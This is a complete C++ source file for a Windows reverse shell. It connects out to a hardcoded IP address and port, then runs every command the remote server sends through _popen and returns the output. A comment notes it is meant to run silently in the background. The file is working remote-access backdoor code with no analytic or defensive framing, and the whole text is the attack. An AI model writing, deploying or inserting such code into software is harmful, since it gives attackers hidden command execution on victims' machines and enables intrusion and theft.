#include <iostream>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <cstdlib>

#pragma comment(lib, "ws2_32.lib")

#define PORT 22235
#define SERVER_IP "192.168.1.137"
#define BUFFER_SIZE 4096

void executeCommand(const std::string& command, SOCKET clientSocket) {
    FILE* pipe = _popen(command.c_str(), "r");
    if (!pipe) {
        send(clientSocket, "Error executing command\n", 24, 0);
        return;
    }

    char buffer[BUFFER_SIZE];
    while (fgets(buffer, BUFFER_SIZE, pipe) != nullptr) {
        send(clientSocket, buffer, strlen(buffer), 0);
    }
    _pclose(pipe);
}

int main() {
    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);

    SOCKET clientSocket;
    struct sockaddr_in serverAddr;

    clientSocket = socket(AF_INET, SOCK_STREAM, 0);
    if (clientSocket == INVALID_SOCKET) {
        std::cerr << "Socket creation failed\n";
        return 1;
    }

    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(PORT);
    inet_pton(AF_INET, SERVER_IP, &serverAddr.sin_addr);

    if (connect(clientSocket, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        std::cerr << "Connection failed\n";
        return 1;
    }

    // Run silently in the background
    while (true) {
        // Receive command from server
        char buffer[BUFFER_SIZE];
        int bytesReceived = recv(clientSocket, buffer, sizeof(buffer) - 1, 0);
        if (bytesReceived <= 0) {
            break; // Connection lost
        }
        buffer[bytesReceived] = '\0';
        
        std::string command(buffer);
        if (command == "exit") {
            break; // Exit if the server sends an 'exit' command
        }

        // Execute the received command on the client
        executeCommand(command, clientSocket);
    }

    closesocket(clientSocket);
    WSACleanup();
    return 0;
}
